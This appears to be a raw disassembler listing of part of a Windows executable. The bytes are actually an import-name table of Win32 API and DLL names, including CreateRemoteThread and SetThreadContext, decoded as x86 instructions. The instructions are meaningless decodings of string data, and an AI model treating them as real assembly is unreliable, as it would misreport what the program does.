  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
